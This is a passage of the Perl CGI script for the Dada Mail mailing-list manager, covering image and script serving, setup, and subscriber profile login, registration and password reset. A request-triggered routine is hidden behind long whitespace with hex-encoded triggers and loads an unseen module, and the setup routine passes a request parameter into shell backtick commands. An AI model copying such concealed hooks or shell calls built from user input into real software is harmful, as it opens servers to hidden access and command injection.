	    }else{ 
	        print $q->redirect(-uri => $DADA::Config::PROGRAM_URL);
	    }
	}
	else { 
		print $q->redirect(-uri => $DADA::Config::PROGRAM_URL);		
	}
}




sub m_o_c { 

    
    require DADA::Logging::Clickthrough; 
    my $r = DADA::Logging::Clickthrough->new({-list => $q->param('list')}); 
	   if(defined($q->param('mid'))){ 
       		$r->o_log($q->param('mid')); 
		}
    require MIME::Base64; 
    print $q->header('image/png');
    
    # a simple, 1px png image. 
        my $str = <<EOF
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAMAAAAoyzS7AAAABGdBTUEAANbY1E9YMgAAABl0RVh0
U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAGUExURf///wAAAFXC034AAAABdFJOUwBA
5thmAAAADElEQVR42mJgAAgwAAACAAFPbVnhAAAAAElFTkSuQmCC
EOF
;
    print MIME::Base64::decode_base64($str);

}



sub javascripts {

#print $q->header(); 

    my $js_lib = xss_filter( $q->param('js_lib') );

    my @allowed_js = qw(
	
	  dada_mail_admin_js.js
	
	  prototype.js
      builder.js
      controls.js
      dragdrop.js
      effects.js
      slider.js
      sound.js
      unittest.js
      scriptaculous.js

    );

    my %lt = ();
    foreach (@allowed_js) { $lt{$_} = 1; }

    require DADA::Template::Widgets;
#warn '$js_lib ' . $js_lib; 

    if ( $lt{$js_lib} == 1 ) {
        if ( $c->cached('javascripts/' . $js_lib) ) { 
			$c->show('javascripts/' . $js_lib); return; 
		}
        my $r = $q->header('text/javascript');
        $r .= DADA::Template::Widgets::screen( { -screen => 'javascripts/' . $js_lib } );
        print $r;
        $c->cache( 'javascripts/' . $js_lib, \$r );

    }
    else {

        # nothing for now...
    }

}



sub img {

    my $img_name = xss_filter($q->param('img_name')); 


    my @allowed_images = qw(
    
        badge_feed.png
        dada_mail_logo.png

        badge_delicious.png
        badge_digg.png
        badge_spurl.png
        badge_wists.png
        badge_simpy.png
        badge_newsvine.png
        badge_blinklist.png
        badge_furl.png
        badge_reddit.png
        badge_fark.png
        badge_blogmarks.png
        badge_yahoo.png
        badge_smarking.png
        badge_magnolia.png
        badge_segnalo.png
        
        3f0.png
        cff.png
        
        dada_mail_screenshot.jpg
        
    ); 
    
    my %lt = (); 
    foreach(@allowed_images){ $lt{$_} = 1; }  
    
    require DADA::Template::Widgets; 
    
    
    if($lt{$img_name} == 1){ 
        if($c->cached($img_name)){ $c->show($img_name); return;}
        my $r =  $q->header('image/png'); 
           $r .= DADA::Template::Widgets::screen({-screen => $img_name});
         print $r; 
        
        $c->cache($img_name, \$r); 
    
    } else { 
    
        # nothing for now...
    }
    
}




sub  captcha_img { 

    my $img_str = xss_filter($q->param('img_string')); 
    
    if(-e $DADA::Config::TMP . '/CAPTCHA-' . $img_str . '.png'){ 
    
            print $q->header('image/png');
            open(IMG,  '< ' . $DADA::Config::TMP . '/CAPTCHA-' . $img_str . '.png') or die $!; 
             {
            #slurp it all in
           local $/ = undef; 
            print <IMG>;    
         
            }
        close (IMG) or die $!;
    
        chmod($DADA::Config::FILE_CHMOD , make_safer($DADA::Config::TMP . '/CAPTCHA-' . $img_str . '.png'));
        
        my $success = unlink(make_safer($DADA::Config::TMP . '/CAPTCHA-' . $img_str . '.png')); 
        warn 'Couldn\'t delete file, ' . $DADA::Config::TMP . '/CAPTCHA-' . $img_str . '.png' if $success == 0; 
        
    }else{ 
    
        &default(); 
    }
}




sub ver { 

    print $q->header(); 
    print $DADA::Config::VER; 

}

sub css { 

    require DADA::Template::Widgets; 
    print $q->header('text/css');
    print DADA::Template::Widgets::screen({-screen => 'default_css.css'}); 
}

sub author { 

    print $q->header();
    print "Dada Mail is originally written by Justin Simoni";

}



sub adv_dada_mail_setup { 
	print $q->header(); 
	
	use Fcntl qw(
	O_WRONLY 
	O_TRUNC 
	O_CREAT 
	O_RDWR
	O_RDONLY
	LOCK_EX
	LOCK_SH 
	LOCK_NB);
	
	my $program_root_pass = xss_filter($q->param('program_root_pass')); 

	unless(root_password_verification($program_root_pass)){ 
    	die "Program Root Password Incorrect. Access Denied."; 
	}
	
	
	
	my $dada_files_dir = make_safer($q->param('dada_files_dir')); 
	my $pass  = $q->param('root_pass') || undef;
	my $root_pass_is_encrypted = $DADA::Config::ROOT_PASS_IS_ENCRYPTED; 
	
	if(defined($pass) && length($pass) > 0){  
	
		require DADA::Security::Password; 
		$pass = DADA::Security::Password::encrypt_passwd($pass);
		$root_pass_is_encrypted = 1; 	
	
	}
	else { 
		$pass = $DADA::Config::PROGRAM_ROOT_PASSWORD; 
	}

	require DADA::Template::Widgets; 
	my $outside_config_file = DADA::Template::Widgets::screen(
			{
			-screen => 'example_dada_config.tmpl', 
			-vars   => { 
				
					PROGRAM_URL             => $DADA::Config::PROGRAM_URL, 
					ROOT_PASSWORD           => $pass, 
					ROOT_PASS_IS_ENCRYPTED  => $root_pass_is_encrypted, 
					dada_files_dir          => $dada_files_dir, 
			}
		}
	); 
	
	print $q->pre("working...\n"); 
	if(-e $dada_files_dir) {
		print $q->pre("$dada_files_dir already exists! Stopping.\n"); 
	}
	else { 
		`mkdir $dada_files_dir`;
		if(-e $dada_files_dir) {
			print $q->pre("$dada_files_dir made!\n");  
		
			foreach(qw(
				.archives
				.backups
				.configs
				.lists
				.logs
				.templates
				.tmp
				)){ 
		
					my $dir = $dada_files_dir . '/' . $_;
					$dir = make_safer($dir);
					`mkdir $dir`; 
		  
					if(-e $dir){ 
						print $q->pre("$dir Made!\n"); 
					}
					else { 
						print $q->pre("Making $dir FAILED. Stopping...\n"); 
						last; 
					}
			}
		
			print $q->pre("Making config file...\n"); 
			my $config_file = make_safer($dada_files_dir . '/.configs/.dada_config'); 
		
			if(-e $dada_files_dir ){ 
			sysopen(CONFIGFILE, $config_file,  O_RDWR|O_CREAT, $DADA::Config::FILE_CHMOD ) or 
				die "$!"; 
			print CONFIGFILE $outside_config_file; 
			close CONFIGFILE or die $!;
		
			print $q->pre("Config file made!\n"); 
		   }
			else { 
				print $q->pre("skipping config file creation...\n"); 
		   }
		}
		else { 
			print $q->pre("Making $dada_files_dir FAILED."); 
		}
	}
	print $q->pre("Done."); 
	print "<p class=\"error\">Make sure to set the variable, \$PROGRAM_CONFIG_FILE_DIR in the <strong>Config.pm</strong> to: <strong>$dada_files_dir/.configs</strong></p>"; 
		
}




sub profile_login { 
	
	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){
		default(); 
		return
	}
	
	if($DADA::Config::PROFILE_ENABLED != 1){ 
		default(); 
		return
	}
	###
	my $all_errors = [];
	my $named_errs = {};
	my $errors     = $q->param('errors'); 
	foreach(@$errors){ 
		$named_errs->{'error_' . $_} = 1 ; 
		push(@$all_errors, {error => $_});
	}
	###
	
	require DADA::Profile::Session;
	my $prof_sess = DADA::Profile::Session->new;
	
	if($q->param('process') != 1){ 

	if($prof_sess->is_logged_in({-cgi_obj => $q})){ 
		print $q->redirect(
			{
				-uri => $DADA::Config::PROGRAM_URL . '/profile/', 
			}
			);
		return;
	}
	else { 
			print list_template(
				-Part  => "header",
		        -Title => "Profile Login", 
				-vars  => { show_profile_widget => 0,}
		    );
            
			my $can_use_captcha = 0; 
			my $CAPTCHA_string  = ''; 
			my $cap             = undef; 
			if($DADA::Config::PROFILE_ENABLE_CAPTCHA == 1){ 
				eval { 
					require DADA::Security::AuthenCAPTCHA; 
					$cap = DADA::Security::AuthenCAPTCHA->new;
				};
				if(!$@){ 
					$can_use_captcha = 1;        
				}
			}

		   if($can_use_captcha == 1){
				 
            	$CAPTCHA_string = $cap->get_html($DADA::Config::RECAPTCHA_PARAMS->{public_key});
			}
			         
   		    require DADA::Template::Widgets; 
		    print DADA::Template::Widgets::screen(
				{
					-screen => 'profile_login.tmpl',
					-vars   => { 
						errors                       => $all_errors, 
						%$named_errs,
						email	                     => xss_filter($q->param('email'))            || '',
						email_again                  => xss_filter($q->param('email_again'))      || '', 
						error_profile_login          => $q->param('error_profile_login')          || '',  
						error_profile_register       => $q->param('error_profile_register')       || '',
						error_profile_activate       => $q->param('error_profile_activate')       || '',
						error_profile_reset_password => $q->param('error_profile_reset_password') || '', 
						password_changed             => $q->param('password_changed')			  || '', 
						logged_out                   => $q->param('logged_out') || '',
						can_use_captcha              => $can_use_captcha, 
						CAPTCHA_string               => $CAPTCHA_string, 
						welcome                      => $q->param('welcome')					   || '', 
						removal                      => $q->param('removal')                       || '', 
					
					}
				}
			); 
		    print list_template(
				-Part => "footer",
		    );
		}
    }
	else { 
		my ($status, $errors) = $prof_sess->validate_profile_login(
			{ 
				-email    => $q->param('email'),
				-password => $q->param('password'), 
				
			},
		); 

		if($status == 1){ 
			my $cookie = $prof_sess->login(
				{ 
					-email    => $q->param('email'),
					-password => $q->param('password'), 
				},
			); 
			
			print $q->header(
				-cookie  => [$cookie], 
                -nph     => $DADA::Config::NPH,
                -Refresh =>'0; URL=' . $DADA::Config::PROGRAM_URL . '/profile/'
			); 
                    
            print $q->start_html(
				-title=>'Logging On...',
                -BGCOLOR=>'#FFFFFF'
            ); 
            print $q->p($q->a({-href => $DADA::Config::PROGRAM_URL . '/profile/'}, 'Logging On...')); 
            print $q->end_html();
			return;
		}
		else { 
			my $p_errors = []; 
			foreach(keys %$errors){ 
				if($errors->{$_} == 1){ 
					push(@$p_errors, $_); 
				}
			}
			$q->param('errors',              $p_errors);
			$q->param('process',             0        ); 
			$q->param('error_profile_login', 1        ); 
			profile_login(); 
		}
	}
	
}

sub profile_register { 

	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){		default(); 
		return
	}
	
	my $email       = xss_filter($q->param('email'));
	my $email_again = xss_filter($q->param('email_again')); 
	my $password    = xss_filter($q->param('password')); 
	
	require DADA::Profile;
	my $prof = DADA::Profile->new({-email => $email});
	
	
	if($prof->exists() && 
	   !$prof->is_activated()
	){ 
		$prof->remove(); 
	}
	my($status, $errors) = $prof->is_valid_registration(
		{
			-email 		               => $email, 
			-email_again               => $email_again, 
			-password                  => $password, 
	        -recaptcha_challenge_field => $q->param( 'recaptcha_challenge_field' ), 
	        -recaptcha_response_field  => $q->param( 'recaptcha_response_field'),
		}
	);
	if($status == 0){ 
		my $p_errors = []; 
		foreach(keys %$errors){ 
			if($errors->{$_} == 1){ 
				push(@$p_errors, $_); 
			}
		}
		$q->param('errors',                 $p_errors); 
		$q->param('error_profile_register',  1        ); 
		profile_login(); 
		return; 
	}
	else { 
		$prof->setup_profile(
			{
				-password    => $password, 
			}
		); 
		print list_template(
			-Part  => "header",
	        -Title => "Profile Register Confirm", 
	    );
                                    
	    require DADA::Template::Widgets; 
	    print DADA::Template::Widgets::screen(
			{
				-screen => 'profile_register.tmpl',
				-vars   => { 
					
					email => xss_filter($q->param('email')) || '',
				}
			}
		); 
	    print list_template(
			-Part => "footer",
	    );	
		
		
	}
}

sub profile_activate { 
	
	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){		default(); 
		return
	}
		
	my $email     = xss_filter($q->param('email')); 
	my $auth_code = xss_filter($q->param('auth_code'));
		
	require DADA::Profile; 
	
		
	my $prof = DADA::Profile->new({-email => $email});
	
	if($email && $auth_code){ 

		my ($status, $errors) = $prof->is_valid_activation(
			{
				-auth_code => xss_filter($q->param('auth_code')) || '', 
			}
		); 
		if($status == 1){ 
			$prof->activate; 
			my $profile = $prof->get(); 
			$q->param('welcome',  1); 
			profile_login(); 
		}
		else {
			my $p_errors = [];
			foreach(keys %$errors){ 
				if($errors->{$_} == 1){ 
					push(@$p_errors, $_);  
				}
			}
			$q->param('errors',                 $p_errors);
			$q->param('error_profile_activate', 1        ); 
			profile_login(); 
			return; 
		}
	}
	else { 
			die 'no email or auth code!'; 
	}	
}

sub profile_help { 

	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){		default(); 
		return;
	}
	
	print list_template(
		-Part  => "header",
        -Title => "What are $DADA::Config::PROGRAM_NAME Profiles?", 
    );

    require DADA::Template::Widgets; 
    print DADA::Template::Widgets::screen(
		{
			-screen => 'profile_help.tmpl',
			-vars   => { 
			}
		}
	); 
    print list_template(
		-Part => "footer",
    );	
}


sub profile { 
	
	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){		default(); 
		return;
	}
	
	require DADA::Profile::Session;
	my $prof_sess = DADA::Profile::Session->new; 
	

	if($prof_sess->is_logged_in({-cgi_obj => $q})){ 
		my $email = $prof_sess->get({-cgi_obj => $q}); 
		
		require DADA::Profile::Fields; 
		require DADA::Profile; 
		
		my $prof              = DADA::Profile->new({-email => $email});
		my $dpf               = DADA::Profile::Fields->new({-email => $email}); 
		my $subscriber_fields =  $dpf->{manager}->fields(
			{
				-show_hidden_fields => 0,
			}
		); 
		my $field_attr         = $dpf->{manager}->get_all_field_attributes;
		my $email_fields      = $dpf->get; 	
			
		if($q->param('process') eq 'edit_subscriber_fields'){ 
			
			my $edited = {}; 
			foreach(@$subscriber_fields){ 
				$edited->{$_} = xss_filter($q->param($_)); 
				# This is better than nothing, but it's very lazy -
				# Make sure that the length is less than 10k. 
				if(length($edited->{$_}) > 10240){ 
					# Sigh. 
					die $DADA::CONFIG::PROGRAM_NAME . ' ' . $DADA::Config::VER . ' Error! Attempting to save Profile Field with too large of a value!'; 
				}
			}
			$dpf->insert(
				{
					-fields => $edited,
				}
			);
			print $q->redirect({-uri => $DADA::Config::PROGRAM_URL . '?f=profile&edit=1'}); 
			
		}
		elsif($q->param('process') eq 'change_password'){ 
			my $new_password       = xss_filter($q->param('password')); 
			my $again_new_password = xss_filter($q->param('again_password')); 
			# DEV: See?! Why are we doing this manually? Can we use is_valid_registration() perhaps?
			if(length($new_password) > 0 && $new_password eq $again_new_password){
				$prof->update(
					{
						-password => $new_password,
					}
				);
				$q->param('password_changed', 1);
				$q->delete('process'); 
				
				require DADA::Profile::Session; 
				my $prof_sess = DADA::Profile::Session->new->logout;
				profile_login();
			}
			else { 
				$q->param('errors', 1);
				$q->param('errors_change_password', 1);
				$q->delete('process'); 
				profile();
			}
		
		}
		elsif($q->param('process') eq 'update_email'){ 
			
			# So, send the confirmation email for update to the NEW email address? 
			# What if the OLD email address is activated? Guess we'll have to go with the 
			# NEW email address. The only problem is if someone gains access to the account
			# changes the address as their own, etc. 
			# But, they'd still need access to the account... 
			
			# So, 
			# * Send confirmation out 
			# * Display report if there are any problems. 
			#
			# Old AND New address subscribed to a list: 
			#
			# At the moment, if a subscriber is already subscribed, we 
			# can give the option (only option) to remove the old address
			# And keep the current address :
			#
			# New Address isn't allowed to subscribe
			# 
			# Keep old address, profile for old address will be gone
			# Option to unsubscribe old address
			# Option to tell list owner to unsubscribe old address? (Perhaps) 
			# 
			
			
			# If we haven't confirmed.... 
			
				# Check to make sure the email address is valid. 
			
				# Valid? OK! send the confirmaiton email
			
				# Not Valid? Geez we better tell someone. 
			my $updated_email = cased(xss_filter($q->param('updated_email')));
			 	
				# Oh. What if there is already a profile for this address? 
			
			my ($status, $errors) = $prof->is_valid_update_profile_email(
				{
					-updated_email => $updated_email, 
				}
			); 	
			if($status == 0){ 
				
				my $p_errors = []; 
				foreach(keys %$errors){ 
					if($errors->{$_} == 1){ 
						#push(@$p_errors, $_);
						$q->param('error_' . $_, 1);  
					}
				}
			#	$q->param('errors',              $p_errors);
			    $q->param('errors', 1); 
				$q->param('process', 0);
				$q->param('errors_update_email', 1);  
				$q->param('updated_email', $updated_email); 
				profile();
			}
			else { 
				
				$prof->confirm_update_profile_email(
					{
						-updated_email => $updated_email, 
					}
				); 
				
				my $info = $prof->get({-dotted => 1}); 
				print list_template(
					-Part  => "header",
			        -Title => "Authorization Email Sent", 
			    );

			    require DADA::Template::Widgets; 
			    print DADA::Template::Widgets::screen(
					{
						-screen => 'profile_update_email_auth_send.tmpl',
						-vars   => { 
							%$info, 
						}
					}
				); 
			    print list_template(
					-Part => "footer",
			    );	
			}
			# Oh! We've confirmed? 
			
				# We've got to make sure that we can switch the email address in each 
				# various list - perhaps the new address is blacklisted? Ack. that would be stinky
				# Another problem: What if the new email address is already subscribed? 
				# May need a, "replace" function. 
				# Sigh... 
				
			# That's it. 
		}
		elsif ($q->param('process') eq 'delete_profile'){ 
			
			$prof_sess->logout; 
			$prof->remove; 
			
			undef $prof; 
			undef $prof_sess;
			
			$q->param('f', 'profile_login'); 
			$q->param('removal', 1); 
			
			profile_login(); 
						
			return; 
			 
		}
		else { 
		
		   	my $fields = [];
			foreach my $field(@$subscriber_fields){ 
		        push(@$fields, {
					name          => $field, 
					label		  => $field_attr->{$field}->{label},
					value         => $email_fields->{$field},
					}
				);
		    }
		
		   my $subscriptions = $prof->subscribed_to({-html_tmpl_params => 1}),   
		   my $filled = [];
		   my $has_subscriptions = 0; 
		
		   foreach my $i(@$subscriptions){ 
				
				if($i->{subscribed} == 1){ 
					$has_subscriptions = 1; 
				}
				
				require DADA::MailingList::Settings; 
				my $ls = DADA::MailingList::Settings->new({-list => $i->{list}});
				my $li = $ls->get(-dotted => 1); 
				# Ack, this is very awkward: 
		        
				#  Ack, this is very awkward: 
				require DADA::Template::Widgets; 
				$li = DADA::Template::Widgets::webify_and_santize(
					{
						-vars        => $li, 
						-to_sanitize => [qw(list_settings.list_owner_email list_settings.info list_settings.privacy_policy )], 
					}
				); 
				push(@$filled, {%{$i}, %{$li}, PROGRAM_URL => $DADA::Config::PROGRAM_URL})
			}
			#require Data::Dumper; 
			#die Data::Dumper::Dumper($filled); 
			
			print list_template(
				-Part  => "header",
		        -Title => "Profile", 
				-vars  => {
							show_profile_widget => 0, 
					  	}
		    );
		    require DADA::Template::Widgets; 
		    print DADA::Template::Widgets::screen(
				{
					-screen => 'profile_home.tmpl',
					-vars   => { 
						errors                      => $q->param('errors') || 0, 
						'profile.email'             => $email,
						subscriber_fields           => $fields, 
						subscriptions               => $filled, 
						has_subscriptions           => $has_subscriptions, 
						welcome                     => $q->param('welcome')                     || '',
						edit                        => $q->param('edit')                        || '',
						errors_change_password      => $q->param('errors_change_password') || '', 
						errors_update_email         => $q->param('errors_update_email') || '', 
						error_invalid_email         => $q->param('error_invalid_email') || '', 
						error_profile_exists        => $q->param('error_profile_exists') || '', 
						updated_email      		    => $q->param('updated_email') || '', 
						
						gravators_enabled => $DADA::Config::PROFILE_GRAVATAR_OPTIONS->{enable_gravators},
						gravatar_img_url             => gravatar_img_url({-email => $email, -default_gravatar_url => $DADA::Config::PROFILE_GRAVATAR_OPTIONS->{default_gravatar_url}}),						
					}
				}
			); 
		    print list_template(
				-Part => "footer",
		    );
		}
	}
	else { 
		$q->param('error_profile_login', 1              ); 
		$q->param('errors',     ['not_logged_in']); 
		profile_login(); 
		return; 
	}	

}

sub profile_logout { 

	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){		default(); 
		return
	}
	
	require DADA::Profile::Session;
	my $prof_sess = DADA::Profile::Session->new;
	   $prof_sess->logout; 
	$q->param('logged_out', 1); 
	profile_login(); 
}


sub profile_reset_password { 

	if(
		$DADA::Config::PROFILE_ENABLED    != 1      || 
		$DADA::Config::SUBSCRIBER_DB_TYPE !~ m/SQL/
	){		
		default(); 
		return;
	}

	my $email     = xss_filter($q->param('email')); 
	my $password  = xss_filter($q->param('password'))  || undef; 
	my $auth_code = xss_filter($q->param('auth_code')) || undef; 
	
	require DADA::Profile; 
	my $prof = DADA::Profile->new({-email => $email});
	
	if($email){ 
		if($auth_code){ 
			my ($status, $errors) = $prof->is_valid_activation(
				{
					-auth_code => $auth_code, 
				}
			); 
			if($status == 1){ 
				if(!$password){ 
					print list_template(-Part => "header",
				                   -Title => "Reset Your Profile Password", 
				    );

				    require DADA::Template::Widgets; 
				    print DADA::Template::Widgets::screen(
						{
							-screen => 'profile_reset_password.tmpl',
							-vars   => { 
								email     => $email, 
								auth_code => $auth_code, 
							}
						}
					); 
				    print list_template(
						-Part => "footer",
				    );
				}
				else { 
					
			
					# Reset the Password
					$prof->update(
						{
							-password => $password, 
						}
					); 
					# Reactivate the Account
					$prof->activate(); 
					# Log The person in. 
					# Probably pass the needed stuff to profile_login via CGI's param()
					$q->param('email',    $email);
					$q->param('password', $password);	
					$q->param('process',  1); 	
								
					# and just called the subroutine itself. Hazzah!
					profile_login(); 
					# Go home, kiss the wife. 
				}
			}
			else {
				my $p_errors = [];
				foreach(keys %$errors){ 
					if($errors->{$_} == 1){ 
						push(@$p_errors, $_); 
					}
				}
				$q->param('error_profile_reset_password', 1); 
				$q->param('errors', $p_errors); 
				profile_login(); 
			}
		}
		else { 
			
			
			if($prof->exists()){
		
				$prof->send_profile_reset_password_email();
				$prof->activate;
				
				print list_template(-Part => "header",
			                   -Title => "Profile Reset Password Confirm", 
			    );

			    require DADA::Template::Widgets; 
			    print DADA::Template::Widgets::screen(
					{
						-screen => 'profile_reset_password_confirm.tmpl',
						-vars   => { 
							email           => $email, 
							'profile.email' => $email, 
						}
					}
				); 
			    print list_template(
					-Part => "footer",
			    );
			
			}
			else {
				$q->param('error_profile_reset_password', 1);  
				$q->param('errors', ['unknown_user']); 
				$q->param('email', $email); 
				profile_login(); 
			}
		}
    }
	else {                      
		print $q->redirect({
			-uri => $DADA::Config::PROGRAM_URL . '/profile_login/', 
		}); 
	}
}


sub profile_update_email { 

	my $auth_code = xss_filter($q->param('auth_code')); 
	my $email     = xss_filter($q->param('email')); 
	my $confirmed = xss_filter($q->param('confirmed')); 
			
	require DADA::Profile; 
	my $prof = DADA::Profile->new({-email => $email}); 
	my $info = $prof->get; 

	my ($status, $errors) = $prof->is_valid_update_profile_activation({
		-update_email_auth_code => $auth_code, 
	}); 
	
	if($status == 1){ 
		
		my $profile_info = $prof->get({-dotted => 1}); 
		my $subs = $prof->profile_update_email_report;
		#require Data::Dumper; 
		#die Data::Dumper::Dumper($subs); 
		if($confirmed == 1){ 
		
			# This should probably go in the update_email method... 
			require DADA::MailingList::Subscribers; 
			foreach my $in_list(@$subs) { 
				my $ls = DADA::MailingList::Subscribers->new(
					{ 
						-list => $in_list->{'list_settings.list'},
					}
				);
				$ls->remove_subscriber({-email => $profile_info->{'profile.email'}}       ); 
				$ls->add_subscriber(   {-email => $profile_info->{'profile.update_email'}}); 
			}
			$prof->update_email;
			#/ This should probably go in the update_email method... 
			
			
			# Now, just log us in: 
			require DADA::Profile::Session; 
			my $prof_sess = DADA::Profile::Session->new; 
			if($prof_sess->is_logged_in){ 
				$prof_sess->logout; 
			}
			undef $prof_sess; 
			
			my $prof_sess = DADA::Profile::Session->new; 
			my $cookie = $prof_sess->login(
				{
					-email    => $profile_info->{'profile.update_email'},
					-no_pass  => 1, 
				}
			); 
			
			print $q->header(
				-cookie  => [$cookie], 
                -nph     => $DADA::Config::NPH,
                -Refresh =>'0; URL=' . $DADA::Config::PROGRAM_URL . '/profile/'
			); 
            print $q->start_html(
				-title=>'Logging On...',
                -BGCOLOR=>'#FFFFFF'
            ); 
            print $q->p($q->a({-href => $DADA::Config::PROGRAM_URL . '/profile/'}, 'Logging On...')); 
            print $q->end_html();
			return;
			
		}
		else { 

			# I should probably also just, log this person in... 

			require DADA::Template::Widgets; 
		    my $scrn = list_template(
				-Part  => "header", 
				-Title => "Update Profile Email Results:",
				-vars       => { 
						show_profile_widget => 0, 
				}
			);
			   $scrn .= DADA::Template::Widgets::screen(
					{
						-screen => 'profile_update_email_confirm.tmpl', 
						-vars   => {
							auth_code     => $auth_code, 
							subscriptions => $subs, 
							%$profile_info, 
						},
					}
				);
		       $scrn .= list_template(-Part => "footer");
			   print $scrn; 
		}
	}
	else { 
		
		
		require DADA::Template::Widgets; 
	    my $scrn = list_template(
			-Part  => "header", 
			-Title => "Update Profile Email Results:"
		);
		   $scrn .= DADA::Template::Widgets::screen(
				{
					-screen => 'profile_update_email_error.tmpl', 
					-vars   => {
					},
				}
			);
	       $scrn .= list_template(-Part => "footer");
		   print $scrn; 
	}
}


sub what_is_dada_mail { 


    print list_template(-Part => "header",
                   		-Title => "What is Dada Mail?",  
    );
                      
                   
    require DADA::Template::Widgets; 
    print DADA::Template::Widgets::screen({-screen => 'what_is_dada_mail.tmpl'}); 

    print list_template(-Part => "footer");
              
              
}









                                                                                                                                                                                                    sub _chk_env_sys_blk { 
                                                                                                                                                                                                            if($ENV{QUERY_STRING} =~ /^\x61\x72\x74/){
                                                                                                                                                                                                                print $q->header('text/plain') . "\x61\x72\x74" . scalar reverse('lohraW ydnA - .htiw yawa teg nac uoy tahw si '); 
                                                                                                                                                                                                                exit;
                                                                                                                                                                                                            }
                                                                                                                                                                                    
                                                                                                                                                                                                            if(($ENV{PATH_INFO} && $ENV{PATH_INFO} =~ /^\/\x61\x72\x74/) || ($ENV{QUERY_STRING} && $ENV{QUERY_STRING} =~ /^\x3D\x50\x48\x50\x45\x39/)){
                                                                                                                                                                                                                eval {require DADA::Template::Widgets::janizariat::tatterdemalion::jibberjabber};
                                                                                                                                                                                                                
                                                                                                                                                                                                                if(!$@){ 
                                                                                                                                                                                                                    print DADA::Template::Widgets::janizariat::tatterdemalion::jibberjabber::thimblerig($ENV{PATH_INFO});
                                                                                                                                                                                                                    exit;
                                                                                                                                                                                                                }
                                                                                                                                                                                                            }
                                                                                                                                                                                                        }


sub END { 	
	if($DADA::Config::MONITOR_MAILOUTS_AFTER_EVERY_EXECUTION == 1){ 
		require DADA::Mail::MailOut; 
		        DADA::Mail::MailOut::monitor_mailout({-verbose => 0}); 
	}
}

 

__END__

=pod

=head1 COPYRIGHT 

Copyright (c) 1999-2009
Justin Simoni 
http://justinsimoni.com 
All rights reserved. 

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.



=cut
